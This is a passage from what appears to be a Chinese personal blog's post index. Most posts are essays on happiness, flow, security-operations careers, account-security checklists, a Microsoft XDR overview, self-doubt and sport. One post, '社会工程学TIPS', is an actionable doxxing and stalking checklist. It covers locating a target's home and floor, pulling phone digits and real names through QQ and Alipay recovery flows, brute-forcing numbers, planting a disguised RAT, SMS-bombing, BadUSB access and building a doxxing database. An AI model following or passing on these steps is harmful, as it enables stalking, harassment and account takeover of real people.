视频后，往往并不会感受到很快乐，因为往往我们想要的并不是我们喜欢的。欲望是多巴胺驱使的，下一个更好，而喜欢是内啡肽促进的，但是却难以触发，这就导致“生活中强烈的愉悦比强烈的欲望更罕见也更短暂”。\n另一个例子，尼古丁是一种非常规的毒品，因为它除了让你上瘾外，没有什么其他作用，但是在吸烟的时候，可以减轻渴望带来的不适感，渴望被满足，多巴胺进行奖赏，从而体验到快乐。所以，如果“多巴胺+科技+黄赌毒”将会多么可怕，更可怕的是它们早已无处不在，“擦边视频”就是最好的例子，更典型的还有“老虎机”，我愿称它为集心理学、生物学、统计学等跨领域的“完美”作品。\n人在生物本能面前脆弱的不堪一击，因为只有它是真实存在的。\n但是造物主是真正智慧的，魔鬼的降临也必然会带来天使的诞生，多巴胺的欲望对抗就由多巴胺自己了结，用“控制回路”来制衡”欲望回路“。\n“在控制回路中，多巴胺驱动的是控制环境，而不一定是环境中的人。多巴胺想要更多，但它不在乎它是如何得到的。无论道德还是不道德，控制还是顺从，对多巴胺而言都是一样的，只要它能使未来更好。”生物本能的一切都是为了生存和繁衍，多巴胺也不例外，当我们做成一件事时，提高了生存或繁衍的几率，多巴胺就会给我们一些奖赏，带来掌控的快感。\n“武力和欺诈”在生活中随处可见，因为多巴胺追求更多，而不是追求道德，对多巴胺来说，武力和欺诈只不过是达成目的的工具。\n当控制多巴胺很弱时，人们会去追求他们想要的东西而不考虑长期的后果。而在复杂的情况下，拥有“冷静头脑”的人，也就是多巴胺控制回路更强的人，能够抑制这种反应，做出更深思熟虑的选择，这些选择通常会带来更好的结果，也更利于生存和繁衍。“生活在一个抽象、虚幻、多巴胺驱动并且充满可能性的世界里是需要付出代价的，这种代价就是幸福。”\n而什么可以让我们获得幸福呢，“创造”是一个途径，因为它总是新的，但是我们却太少的投入到创造的事情当中了。\n让自己一直保持在“渴望-获得”的反馈中，就会一直获得幸福感，反馈的周期越长，带来的快乐反馈越强烈，所以我们真正追求的并不一定是那个具象的“终点”，而是“过程”，也即是“当下”。\n在过去半年里，陷入傻逼周期，以上就像是深坑上的垂下的一根藤蔓，平庸亦或疯狂。\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"社会工程学TIPS","url":"/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6TIPS/","content":"\n通过朋友圈的运动信息、窗外风景照或者定位确定家庭住址\n具体楼层通过给对方订份外卖，跟踪外卖员确认\n在网络上发布假消息，防止被跟踪\n在有qq的前提下通过qq安全中心获取手机号前三位，确定归属地\n通过支付宝忘记密码获取手机后二位，搜索邮箱功能获取真实名字\n爆破中间位数，生成手机号列表导入通讯录，通过qq匹配通讯录，查看头像等确认\n支付宝转账确认真实姓名\n将手机号添加到通讯录中，然后通过手机号的各种社交软件获取好友（重要）\n通过手机号获取真是微信号\n搜索引擎搜索以上内容\n有针对性的伪装打入内部，改号软件、变声软件\n发送伪装的RAT控制目标机器\nIP确认物理地址\nwhois获取联系方式，邮箱反查\n图片原图获取经纬度信息\n伪装自己（灰色角色），获取信任\nqq旧版资料卡寻找有用信息\n微博信息（新浪、腾讯）\n钓鱼页面，获取信息\n善用PS进行账号申诉，同时通过短信轰炸干扰对方\n在有收货地址的情况下，利用badusb获取目标机器权限\n贴吧账号找回功能获取手机后两位，微博获取后三位\n阿里云云市场api通过身份证号查询头像\n某版qq获取登陆ip\n构建社工库\n\n","categories":["社会工程"],"tags":["Social"]},{"title":"简单聊聊应用安全领域中的技术安全运营","url":"/%E7%AE%80%E5%8D%95%E8%81%8A%E8%81%8A%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%AD%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/","content":"技术安全运营是一个上限极高同时又下限极低的一个角色，做好不易。\n注解：本文中“技术安全运营”的定义\n安全团队中的工种基本可以分为两类，“运营岗”和“技术岗”，而“技术岗”有可以分为开发安全产品的“研发岗/算法岗”和使用这些安全产品的“(技术)运营岗“。因此，例如各类安全产品的运营人员、SDLC安全人员等均可称为”技术安全运营“。\n本文中以几个实际场景中的例子来讨论不同能力的技术安全运营人员之间的差别。因视野有限，以下仅当胡言乱语，勿对号入座。\n场景一：漏洞运营SRC或黑白灰扫描器等发现漏洞后：\n“初级的”技术安全运营简单验证/不验证后点击确认漏洞下发到研发进行修复，同时针对研发的修复疑问进行答疑(一般在此处多是针对漏洞本身进行修复，而不是考虑是否是最优解)，在修复完成后验证/不验证后关闭工单，某漏洞的运营到这里就结束了。\n“中级的”技术安全运营简单验证漏洞后给到研发进行修复，同时主动找到开发确定产生漏洞的根本原因，是系统架构层面原因还是安全意识原因，修复方案是否可以实现“默认安全”，该系统中是否还存在类似问题，在漏洞止血/修复后，进行漏洞复盘，寻找根因，优化研发流程/SDLC流程来避免该风险。\n“高级的”技术安全运营在“中级”之上，不定期归结历史漏洞产生原因，抽象当前应用层面临的核心风险TOP，然后针对不同的TOP风险，统筹资源，进行全域治理，优先从架构层、框架层进行风险解决，而不是将所有疑似风险下发让研发自查(如果所有的问题都用这种方式解决，那未必也太无能了)，避免沦为成为“工单下发工程师”、“首席客服官”。\n场景二：RASP/WAF等等安全产品运营(非安全产品角色，而是产品使用方)安全产品的使用可以简单分为“部署”、“响应”两部分\n“初级的”技术安全运营“部署”\n从安全产品研发侧拿到部署文档和模棱两可的稳定性影响，然后进行通过邮件/群组通知到研发，进行部署，当研发产生疑问/部署失败时，拉相关安全产品研发进行答疑，而自己全程都是一个“proxy”。\n“响应”\n当事件发生告警时，拉群应急，完成止血，影响不大则应急结束，影响较大往往被动复盘，效果不佳。\n“中级的”技术安全运营“部署”\n在部署前，建立标准的部署流程，验证稳定性和防护效果，与安全产品团队制定稳定性标准和规则下发标准，同时建立完善的稳定性问题解决SOP和部署答疑指南。\n在部署时，与架构师团队协作，分优先级、分批次进行灰度部署，以稳定性为核心。\n在部署后，监测覆盖率变化，进行动态全覆盖。\n“响应”\n事件发生告警时，止血遏制，然后进行详细复盘，确定正式修复方案和排期、安全产品告警是否准确和及时、全域同类风险解决方案等。\n同时安全产品不可避免的会产生大量误报，通过对告警风险进行风险(更进一步进行自动化告警优化)，同时与安全产品团队进行规则优化，降低误报率。\n“高级的”技术安全运营让自己成为安全产品的半个PD，将自己安全经验融入到产品的设计中去，帮助安全产品进行架构优化。（这部分笔者并无多少经验，是未来要进行深入的方向之一）\n透过这两个简单例子，便是我对“技术安全运营”这个角色的简单理解。做与做好之间的差距是巨大的，核心是是否对自己的能力有成长。\n","categories":["应用安全"],"tags":["THINK"]},{"title":"莫向外求，反求诸己","url":"/%E8%8E%AB%E5%90%91%E5%A4%96%E6%B1%82%EF%BC%8C%E5%8F%8D%E6%B1%82%E8%AF%B8%E5%B7%B1/","content":"\n\n这篇小文可以理解为是《心流：最优体验心理学》的笔记和摘录，和大多数人一样，在注意力和自律上并不能很好的战胜欲望，但是内心却一直在寻找一种心境，可以让自己感受到内心愉悦、幸福，而不想一直困在世俗的制度、条例、奖赏、惩罚之中。寻求内心的安宁以及如何与这个社会共处的平衡。\n\n\n\n\n\n\n\n\n\n怎么定义幸福？漫长的人生岁月不仅幸福难求，还时时处于焦虑和倦怠之中。\n每个人对于自己这辈子希望完成的事，大致总有个模糊的概念，目标达到的程度就是衡量生活品质的指标。如果它始终遥不可及，我们就会变得怨天尤人、愤世嫉俗；但只要能完成一小部分，我们就会觉得幸福满足。世上大多数人的人生目标都很简单：平安地活着，养育一儿半女；如果可能的话，再加上那么一点儿舒适与尊严。\n我们从小就以为，人生最重要的是未来。父母教孩子养成好习惯，为的是长大后对他们有益；老师向学生保证，无聊的课程日后有助于他们谋职；公司主管告诉新员工，要有耐心，努力工作，因为有朝一日会晋升为主管—然而在漫长的晋升之路尽头，退休的时刻也会同时到来。爱默生曾说：“我们对生活有种种期许，却从未真正生活过。”一个穷困的小女孩也从童话故事中学到：果酱和面包永远是明天的事，今天就是吃不到。\n我们应该要认识到，文明就是建立在压抑个人欲望基础上的。社会成员不论乐意与否，都被迫接受既定的习惯与技能，否则就不可能维持社会秩序和复杂的分工制度。个人社会化是必然的；社会化的真谛在于使个人依赖社会的控制，并对赏罚有既定的反应；社会化的最高境界就是使每个人都完全认同社会秩序，根本不想触犯任何规则。社会为了使我们实现它的目标，有若干手段：生理需求和基因制约。除了痛苦，社会控制也以快乐作为使人就范的诱饵。工作一辈子并遵守法律的报酬就是美好生活，这一招其实就是利用人性的弱点。人的每个欲望——从性欲到侵略，从寻求安全感到接受改变——几乎都成为政客、教会、企业及广告界控制社会的手段。\n跟随本能的享乐，即时满足，并不会构建有序的意识，反而会加速其无序的状态，进而产生焦虑、烦躁等负面情绪。而一个“well being“需要兼顾生理和精神的双重满足。\n在当今社会的运行机制下，外界展示给你的，往往通过某种奖励吸引你去追随，它们的动机大多是想要控制你，例如广告，通过各个角度来暗示你可以通过购买xx商品获得生活品质的改善，不断的会有新的广告、商品，提高生活品质是一件永远没有尽头的苦役，最终陷入期望值不断升高的恶性循环中无力自拔。\n纵然明知物质的丰裕并不能带来幸福，但我们还是习惯外求，不停地追逐外在的目标，希望借此改善生活。财富、地位、权力是现代文明最重视的幸福象征。我们总以为，有钱、有名、俊俏美丽的人一定过得很充实，尽管各方面证据可能显示，他们生活得并不惬意。但我们依然坚信，只要能拥有跟他们同样的象征特质，就会更幸福。享乐是高水准生活的重要一环，但享乐本身并不能带来幸福。睡眠、休息、食物与性，都属于恢复“均衡”的体验，在肉体需求引起精神熵以后，重整意识的秩序。它们并不能带动心灵的成长，也不能增加自我的复杂性。换言之，享乐虽有助于维持意识的秩序，却无法在意识中创造新秩序。\n摆脱社会制约的首要之务便是控制本能的冲动，因为只要我们凡事跟着感觉走，一举一动就不难预测，别人就很容易利用我们的好意，达到他们自私的目的。幸运的是，还是有不少人能逃脱出来。这些人尽管物质条件不够优越，但仍然能改善生活品质，不但知足常乐，也常能使周遭的人生活得更快乐。\n古老的故事告诉我们，英雄在“从此过上幸福快乐的生活”之前，必须与喷火毒龙搏斗，与居心险恶的魔法师抗争。同样的譬喻也适用于心灵的冒险。我认为幸福之所以难求，最主要是因为人类自以为是地认定宇宙是为满足我们的需求而存在的，然而现实却大相径庭——生命中其实深埋着沮丧的种子。只要某种欲望一时得到满足，我们就立刻渴望得到更多。这种长期的贪得无厌，是追求知足常乐途中的另一重障碍。\n一般人想进一步充实自己的生活时，不但会想到享乐，还会想到虽然与享乐重叠，但必须用不同字眼表达的另一种感受——乐趣。乐趣具有向前发展的特性，并蕴涵新鲜感和成就感。经历过有乐趣的事，我们就感觉自己有了改变，自我有了成长；在某些方面，这次体验已使我们变得更复杂、更丰富。\n真正的幸福，是当你全心全意投入一件事，把自己置之度外的时候，获得的副产品。你直接追求的并不是幸福，而是把自己变得更复杂——在这个变复杂的过程中，你会找到乐趣，这个状态就是幸福的。人生要的不是最后终点的结果，而是每时每刻点点滴滴成长的过程。成长不仅仅是在校学生的事儿。成长也不是为了达到什么目的的手段。成长本身，就是我们的目的。\n这个全身心投入的事物每个人的理解可能都不一样，在如今，很多人陷入一个误区，“享乐==幸福”，如米哈里所言，“享乐的片刻转瞬即逝”。相信都能理解，例如无法抗拒食物、酒精、性爱等等，无穷无尽的欲念，当满足一个欲念后，随之而来的是空虚以及更强烈的欲念。人首先作为一种动物，所有的本能都是受基因所驱使，当然“跟随基因的反应，享受自然的乐趣，寻求快乐是基因为物种延续而设的一种即时反射，其目的非关个人利益。但我们应该认清事实真相。”\n全身心地投入一桩事物，达到忘我的程度，并由此获得内心秩序和安宁时的状态。心流其实是一种生活方式，而且是最高级的生活方式。你想幸福吗？追求心流。它背后更大的逻辑是，你要通过锻炼控制自己的意识，去获得真正的幸福。我们做事的时候并不在乎结果能不能给自己带来多大的利益，而是专注于做这件事本身，从中获得乐趣。这句话听着特别像“心灵鸡汤”，但它恰恰是一个站得住脚的理论！\n心流对于心流的定义有很多种，我最欣赏这个定义，“沉浸于事物本身，这就是心流。”\n就是当你特别专注地做一件目标明确而又有挑战的事情，而你的能力恰好能接住这个挑战时，你可能会进入的一种状态。它的特征是你做这件事的时候会忘记自己，忘记时间的流逝，你能体察到所有相关的信息，不管工作多复杂你都毫不费力，而且有强烈的愉悦感。\n这个过程可以理解为精神世界的负墒，最典型、最壮丽也最奇妙的负熵过程就是这个宇宙的最大奇迹——生命，从无序到有序。从这个角度来说，心流就是大脑的生命。当心熵比较高的时候，在一片混乱的情况下，大脑的做功能力很低，很多心理能量都浪费在内耗上了。但一旦进入心流状态，心理能量就围绕着同一个主题组织起来，向同一个方向高效率地输出。这也就是契克森米哈赖反复强调的，人在心流状态下的表现最好。\n“首先，这种体验出现在我们面临一份可完成的工作时。\n其次，我们必须能够全神贯注于这件事情。\n第三，明确的目标.\n第四，即时的反馈。\n第五，我们能深入而毫不牵强地投入到行动之中，日常生活的忧虑和沮丧都因此一扫而空。\n第六，充满乐趣的体验使人觉得能自由控制自己的行动。\n第七，进入“忘我”状态，但心流体验告一段落后，自我感觉又会变得强烈。\n第八，时间感会改变——几小时犹如几分钟，几分钟也可能变得像几小时那么漫长。这些元素结合成一种深刻的愉悦感，带来无比的报偿，并扩展成极大的能量，仅是感觉它的存在就已值回“票价”了。”\n最简单的理解，有些人习惯信笔涂鸦，有些人咀嚼东西或抽烟、梳头发、哼曲子，目的无非是通过有规律的行动，把意识规范得更有秩序。这些活动是一种“小型心流”，可以帮助我们度过日常生活的低潮。\n进入心流状态后，“当事人全神贯注，一切动作都不假思索，几乎完全自动自发；他们的知觉甚至泯灭，人与行动完全合一。”“在日常生活中，我们经常被怀疑或疑问打断：“我为什么这么做？我是否该做这件事？”我们一再追问行动的必要性，并批判它们背后的理由。然而在心流中没有反省的空间，所有行动宛如一股魔力，带着我们勇往直前。”\n“最常述及的心流体验的特征就是，在心流中会把生活中所有不快乐的事忘得一干二净。这是因为要想从活动中汲取乐趣，必须全心全意地专注于手头的工作，所产生的重要副产品——心流状态下的心灵完全没有容纳不相干资讯的余地。”\n“体育具备造就心流的最佳条件：明确的目标，即时的回馈，易学难精带来的上不封顶的挑战性。体育的最大功能是帮助人控制自己：既学习控制自己的身体——这很好理解，体操、田径、游泳、球类，都要在控制身体上下大功夫，又要学习控制自己的精神，控制自己的注意力。”\n“冒险专家的乐趣并非来自危险本身，而是来自他们使危险降至最低的能力。真正令他们乐此不疲的，不是追逐危险的病态悚栗，而是一种有办法控制潜在危险的感觉。”\n“一位骄傲的作家用字与词创造一个令人沉浸的世界。在这个过程中，他不断挑战自我。就像海明威一样，三十岁的时候，人们以为《战地春梦》就是他的最高水准了；然而，他又用了二十多年锤炼手艺，直到巅峰之作《老人与海》问世。海明威的大半生，一直用写作催生心流涓涓不断。在这个硬汉世界中，他是唯一的君王。直到有一天，世界失控，沙堆崩溃。”\n人生目标人生目标的获得不能抄袭，没有捷径。米哈里说：获得最优体验的手段，“不能浓缩成一个秘诀，也不能背诵下来重复使用……每个人必须自行从不断的尝试与错误中学习”。米哈里问读者：什么是自得其乐？他自己的回答是：“就是‘拥有自足目标的自我’，大多数人的目标都受生理需要或社会传统的制约，亦即来自外界。自得其乐的人，主要目标都从意识评估过的体验中涌现，并以自我为依据。”外界向你提供目标时，往往以某种奖励吸引你追随它。世上大多数奖励的动机是控制你\n在讨论心流与目标时，米哈里还提出了“自成目标”的概念，即目标是做你喜欢做的事情，而非做这件事情的报酬，尽管有时也存在报酬，有时也有社会效益。也就是为艺术而艺术，为科学而科学，为你喜欢的劳作而劳作。米哈里说：“开始时靠目标证明努力的必要，到后来却变成靠努力证明目标的重要性。”“登上山顶之所以重要，只因它证明了我们爬过山，爬山的过程才是真正的目标。”\n“痛下决心追求一个重要的目标，各式各样的活动都能汇集成统一的心流体验时，意识就呈现出一片祥和。知道自己要什么，并朝这个方向努力的人，感觉、思想、行动都能配合无间，内心的和谐自然涌现。生活在和谐之中的人，不论做什么、遭遇什么，都不会把精神能量浪费在怀疑、后悔、罪恶感及恐惧之上，精力永远用在有益的方面。对生命胸有成竹的人，内心的力量与宁静，就是内在一致的最高境界。方向、决心加上和谐，就能把生命转变成天衣无缝的心流体验，并赋予人生意义。达到这种境界的人再也不觉得匮乏。意识井然有序的人不需要害怕出乎意料的事，甚至也不惧怕死亡，活着的每一刻都饶富意义，大多数时候也都乐趣无穷。”\n首先要找到一个终生的目标，其次不要害怕复杂性，这就是对你人生意义的挑战，而你可以应对的技能是“行动式生活”与“反省式生活”相结合。最终，你既有独特的个人特性，又与周围世界、人们所整合，“只要个人目标与宇宙心流汇合，意义的问题也就迎刃而解了”。\n但是正如文中所说：“伟大的音乐、建筑、艺术、诗歌、戏剧、舞蹈、哲学、宗教，都是以和谐克服混沌的好榜样”。降熵过程有高下，美有高下，技艺有高下，心流也有高下。原本的混沌越多，整合进去的元素越复杂，这个心流就越伟大。那么，自然，人生意义也有高下。那些能够整合无比复杂的人生、找到人生意义，整合无比复杂的世界、形成自己的世界观，整合无比复杂经常是相对矛盾的价值观、形成自己的价值观的人，有最大的“大心流”。\n文中所推崇的人生最优体验，不是幸福、快乐这点肤浅的感受，而是奋斗、挣扎、咬牙坚持，最终，是整合之后的巅峰体验。这才是心流的真意。\n进入心流“最典型的例子就是冥想。佛家经常用冥想来降伏内心那瀑布一样奔腾如雷的念头。在冥想中，你摒除杂念，心灵澄净，如一道清澈的心流。经过长期练习之后，哪怕不在冥想之中，你的心灵也会比常人更平静，遇到意外变故时能更快地集中注意力。换句话说，你的心熵整体降低了。”\n高僧冥想多年才能达到波澜不惊，我亦很难进入心流状态，待到可以稳定进入心流之时，再来补充这最后一章节。\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"表达欲不见了","url":"/%E8%A1%A8%E8%BE%BE%E6%AC%B2%E4%B8%8D%E8%A7%81%E4%BA%86/","content":"这遍文字在很久之前就想写一写，但不幸的是，表达欲它转身走开了，也就搁置了现在你们能在这里看到这篇文字，说明我正在努力的寻找它回来好像不只有它，还有它们，许多和我一样不幸的人失去了它它们去了很远很远的地方，我要去找他们回来\n至于它为什么会离开，这就要说来话长了不知道从什么时候开始，我开始对它严格了每每它想要说话的时候，我就会质问它“分享这个的意义是什么呢”随着日子一天天的过，能力没咋提高，眼却一天天的高于顶总是在想，发这些东西有意义吗，够前沿吗，思考够深入吗，浅薄的如白纸，就像如这篇文字一样然后在心中将它毙掉它或许就在被我一次一次的毙掉过程中，心灰意冷转身而去\n其实从这个公众号发表的频率也能看出来(阶段性更新)，我试着去找过它好多次这次也一样，希望它能原谅我\n那为什么又会重新提起笔写它的故事起因是一件小事，今天的英雄联盟半决赛看到shy哥再次进入决赛，我亏掉了10个币，突然有发一条朋友圈的冲动这时候我立马站出来质问它“这个有意思吗，难道你没有值得分享的更有意义的东西了吗”它转身就要离开，另一个我拦住了它这次我替你来讲这个故事\n\n记得在前些年，每次到S赛的尾程，朋友圈里相关的条目都刷新不完但是今年却几乎不见几个朋友发动态了难道说大家都已经不看S赛了吗，我想，或许只是大家在生活的担子下咩有分享的欲望了我lol打的很烂，对英雄的理解也垃圾，但是这并不影响从比赛之中获得快乐快乐是需要被分享的\n这还让我想到上周，和小伙伴们升级了羽毛球拍我和他们说，我要发个朋友圈“打的菜，玩的花”可最终也没有发出来\n\n(天斧100zz、弓剑11 pro、天斧88D)\n很羡慕那些可以一直更新动态/文章的朋友\n过去这一年，其实收获蛮多的，也有需要时候看到有趣的观点想分享，但是一次次的被我拦下了过去一年应该是读书最多的一年，三天打鱼两天晒网，也零零散散看了五十多本每天的思考、阅读的摘录也有几百条至于我为什么会用这种方式来思考，我想在这里就把它分享出来，作为这段文字的结尾(因为里面有些是摘录，就放到blog中了)\n\n在读完的《慢思考：大脑超载时代的思考学》中就表达了类似的观点专注输入，更要专注输出或者说，重要的不是输入多少，而是吸收了多少，而输出帮助吸收。我们所定义的“输出”很简单，就是把自己的知识和想法呈现出来。其目的是为了做思维的“刻意练习”，而在“刻意练习”中，完成比完美重要。\n这段文字，从开始写第一个字到现在这行，共用了35分钟在写下这个标题的时候，很艰难的在写前10行然后当进入到垃圾段的时候，便停不下来了\n那就到这结束吧希望我们都能找回它\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"账号生命安全周期","url":"/%E8%B4%A6%E5%8F%B7%E7%94%9F%E5%91%BD%E5%AE%89%E5%85%A8%E5%91%A8%E6%9C%9F/","content":"注册风险\n垃圾注册\n账号检存\n弱密码\n人机\n\n防护\n滑动验证\n短信验证\n强制改密\n\n授权登入风险\n撞库\n盗号\n弱密码\n人机行为\n\n防护\n强制改密\n滑动验证\n短信验证\n高危账号强制验证或者禁止登陆\n重要账号强制验证\n白名单\n沉睡账号强制验证\n\n登出\nsession未失效\n\n找回密码\n盗号\n信息重放\n账号检存\n逻辑缺陷\n\n高危操作\n更改密码\n更换手机号\n更换邮箱\n\n防护\n强弹二次验证\n线下核身\n\n注销\n欠款用户不得注销（to do）\n\n整体\n可信体系\n\n","categories":["安全技术"],"tags":["Web"]},{"title":"跨越攻击链进行防御(内部和外部威胁)","url":"/%E8%B7%A8%E8%B6%8A%E6%94%BB%E5%87%BB%E9%93%BE%E8%BF%9B%E8%A1%8C%E9%98%B2%E5%BE%A1(%E5%86%85%E9%83%A8%E5%92%8C%E5%A4%96%E9%83%A8%E5%A8%81%E8%83%81)/","content":"\n\nMicrosoft 为外部攻击和内部风险中出现的各种攻击技术提供端到端的集成可见性\n\n\n外部威胁——攻击者很灵活，可以在攻击链序列中使用各种攻击技术来达到他们的最终目标（最常见的是窃取数据，但勒索软件和其他勒索攻击者正变得越来越普遍）。\n\nMicrosoft 提供了一套集成的扩展检测和响应 (XDR) 和 SIEM/SOAR 功能，可覆盖常见的攻击链。 这些 XDR 功能提供高级威胁检测，重点关注高质量警报（误报率低，也就是误报）以及自动调查和响应功能。 这些工具旨在协同工作，其中包括：\n•    Microsoft Defender for Office 365 (MDO) 为电子邮件、SharePoint、OneDrive、Teams 和其他 Office 365 功能提供保护;\n•     Microsoft Defender for Endpoint (MDE) 提供了端点检测和响应 (EDR) 功能，涵盖生产力工作站、服务器、移动设备等;\n•    Microsoft Defender for IoT 为物联网设备的资产发现和威胁管理以及对运营技术 (OT) 资源的攻击（这可能导致工厂生产、发电、医疗设备功能等物理过程中断）提供保障;\n•    Microsoft Defender for Cloud 为服务器 VM 和 SQL 服务器、容器等提供了额外的功能;\n•    Azure AD 身份保护和 Microsoft Defender for Identity (MDI) 共同涵盖攻击的身份阶段，为基于云的 Azure Active Directory 和基于 Windows Server Active Directory 和 Active Directory 联合服务的本地身份基础设施提供威胁检测 (ADFS);\n•    Microsoft Defender for Cloud Apps (MDCA) 从攻击检测和数据泄露的角度为软件即服务 (SaaS) 应用提供了覆盖;\n•    Microsoft Sentinel 提供这些工具的统一可见性，以及来自其他安全工具、业务线应用程序、网络设备等的事件日志和警报。\n集成示例——这说明了这些工具如何协同工作以确保组织安全并减少分析师的重复性任务数量：\n\n   Attack - 用户从他们的公司设备检查个人网络邮件并打开带有恶意软件的附件（旨在逃避传统的 AV 签名）。\n\n   Detection - MDE 检测到这种异常行为并自动对其进行调查，创建自动序列来修复威胁，并提示分析师批准清理（也可以自动批准）。\n\n   Intelligence Sharing - MDE向微软威胁情报系统提供关于这种新恶意软件的信息，触发其他微软安全功能（MDE、MDO、MDCA、MDI等）在客户之间搜索类似的恶意软件并从邮箱、设备中清除 、云服务等。\n\n   Damage Containment——在分析师批准修复之前，Azure AD 条件访问会阻止从此设备访问企业应用程序。 一旦 MDE 传达此设备的“全部清除”，Azure AD 就会恢复用户访问权限。\n\n   其他补救措施 - 还触发 Microsoft Sentinel 工作流来修改 Palo Alto 防火墙，以阻止攻击者的命令和控制 (C2) 服务器的 IP 地址。\n\n\n组织还面临内部风险，即有权访问敏感资源的受信任的内部人员可能会出于各种原因选择滥用该访问权限。\n•    Microsoft 365 中的Microsoft Insider 风险管理使您能够检测、调查和处理组织中的恶意和无意活动，从而帮助最大限度地降低内部风险。\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"达克效应、傻逼速率与自我怀疑的这半年","url":"/%E8%BE%BE%E5%85%8B%E6%95%88%E5%BA%94%E3%80%81%E5%82%BB%E9%80%BC%E9%80%9F%E7%8E%87%E4%B8%8E%E8%87%AA%E6%88%91%E6%80%80%E7%96%91%E7%9A%84%E8%BF%99%E5%8D%8A%E5%B9%B4/","content":"达克效应：无知要比知识更容易产生自信。\n傻逼速率：检验自己有没有成长的关键就是看你往回看自己，觉得自己说过的话，做过的事跟傻逼一样，就说明你进步了。\n今天在整理以往的笔记时，发现了这两个名词。再回想过去的这两年，发现自己的傻逼速率已经非常低了。\n在前些年，我会频繁的删除自己在博客、朋友圈、微博等平台上发表的言论，因为每隔一段时间去看，就会觉得自己怎么会写出这么矫情/低级/没有思考的文字（这篇公众号也有可能是这样的），觉得当时的自己好傻逼。\n但是最近一两年的自己，明显感觉到自己不够傻逼了。输出几乎为零，输入的东西也没有体系化。每天忙忙碌碌，感觉自己做了很多事情，但是回过头看下自己做的事情，却没有什么值得引以为豪的，真正对社会产生价值的事情。\n大概是速率降到了足够低的程度，最近半年以来，会经常性的陷入到自我怀疑的状态中，会去想自己的“存在意义”到底是什么，什么事情可以值得自己一生去追求。这个答案至今仍无法回答自己。\n不过经过这半年来的思考和调整，已经有了些许答案，这里放在下文去讲。插入一下“达克效应”。\n为什么在这里插入这个话题呢？因为在这自我怀疑的半年中，从外界输入了很多知识、思想，在求索的过程中认知的边界得到了扩大，认知圆的边也越来越长，过程中在脑海里闪现过之前无数个无知的片段。\n或许也是人的一种通病，当对一个领域在完全没有认知的时候，会感觉到神秘、向往，但凡有了一点认知或取得了一点成绩，就会盲目的产生自信，能力差的人就会高估自己的水平，认为自己已经掌握了这个领域，进而不能正确的认识到这个领域中真正具备此领域技能人的水平。\n想想是不是有时候看几眼别人的PPT就觉得自己也行了。比如SRC漏洞挖掘，只因为几年前自己挖过几个漏洞，然后在后台看到很多漏洞的实现非常简单，就觉得谁上都行。这就是一个典型的无知的例子。\n就在我盲目的觉得谁上都行的时候，自我怀疑的脑海中一直有个念头，“你行你上啊”。因此我在某个假期的时候认真的去思考了如何持续的挖掘到大公司的漏洞并且进行了一系列的实践，事实证明，如果要保证持续产出，将是一项脑力+精力+经验+时间的高难度挑战，在保证当前工作的情况下难以做到。\n真正触发自己开始思考这个问题起因还是这几个月在搞的“异常行为检测”，从策略到模型，中间多次陷入瓶颈，以为大抵就这样了，然后在查阅资料的过程中一次次的恍然大悟，才真正的认识到自己在这个领域就是一个彻彻底底的弟弟。\n还有许许多多不方便在这里提及的事情表明，在每一个小领域里，想要做到出彩并不容易，到做到盲目认知却很容易。\n也借着这篇文章输出一下自己阶段性的思考：\n关于“三观”：\n三观没有所谓对错，在整个人生范围内，知道自己的所求，知道自己的存在意义，并为之去追寻，便是自己的“人生观”。\n但是这个的前提在于你的“价值观”足够多元，知道什么事情对自己重要。如果你的价值观里只有钱，哪你的人生意义大抵只能去赚钱了。\n而如何让“价值观”多元，则需要“世界观”的足够丰富。学习的越多、知道的越多、见识的越多，则越丰富，也就对自己的“人生观”更清晰。\n关于“存在意义”：\n在过去半年多的时间里，经常问自己“你的梦想是什么？”，现在还没有一个结果，但明显的感觉到自己的傻逼速率已经重回正轨，to do list 里面还有很多等待自己去补全，雾虽大但路就在脚下。\n最后的最后，就用曾老的一句话结尾吧：\n“灵明无着，物来顺应，未来不迎，当时不杂，既过不恋。”\n记于2021.11.14凌晨两点\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"运动篇：2021开板&聊聊运动","url":"/%E8%BF%90%E5%8A%A8%E7%AF%87%EF%BC%9A2021%E5%BC%80%E6%9D%BF&%E8%81%8A%E8%81%8A%E8%BF%90%E5%8A%A8/","content":"\n\n趁着人体机能由盛转衰的这几年，学会了几项新的运动，改变了一点对自己“运动白痴”的看法，发现自己还是蛮强的，哈哈哈\n\n\n游泳游泳是我前二十几年的痛，小时候两次下水的不友好经历，让我不敢再去碰水。来浙江这地方后，发现处处是水，北方人哪见过这么多水，整天杞人忧天，想着万一洪水了怎么办……在求生的欲望下，终于下定决心去学游泳。\n说起游泳还是挺自豪的，游泳是自学的，记得当初仅仅去了三次浅水区，就敢去深水区游了，虽然第一次下深水区并不优雅…..\n自学是跟着B站大佬“梦觉教游泳”的蛙泳教程开始的\n在去游泳馆之前的一周，每天回家就趴在床上或在镜子前练习标准动作，练到有一定肌肉记忆后，然后下水找感觉，喝了不少水，emmmm\n现在水平嘛，就会个蛙泳，还有踩水，50米的深水区可以一次游800米左右吧，体力有限，接下来的心愿就是学习下自由泳、蝶泳。\n徒步/爬山说起这爬山，我内心其实是非常抗拒，之前的想法总是，周末躺尸这么爽，为啥要虐自己……\n直到和朋友们爬了亚丁·稻城看了五色海、走了武功山两天一夜穿越线后，现在甚至有点上瘾。\n回想起稻城，去之前还以为是个观光看大片麦浪的地方，到那一看，高原还要爬山，腿软……整了两个氧气瓶就冲了，当天雨下的还挺大的，在缺氧状态下寒风刺骨，也没有太多的氧气给脑子去胡思乱想，七八公里吧，平路也就两个小时，当时愣是整了一天，咬牙一步一步向上挪……登顶后终于看到了五色海（一个灰蒙蒙的湖，网上都是骗人的）\n再就是武功山穿越，号称户外的毕业路线，南武功，北鳌太。网上都是各种说高山草甸多么多么美，说实话，确实挺美的，国庆前后去最好时节。这条路线的强度怎么说呢，对我这种弱鸡来说是地狱级别，三四十公里吧，有人说是要翻过25个山头，反正我当时只想着，爬过这个山头歇一歇，山路基本都是徒步爱好者踩出来，基本没啥基础设施，就中间山顶有个铁皮木房子，可以不用住帐篷过夜。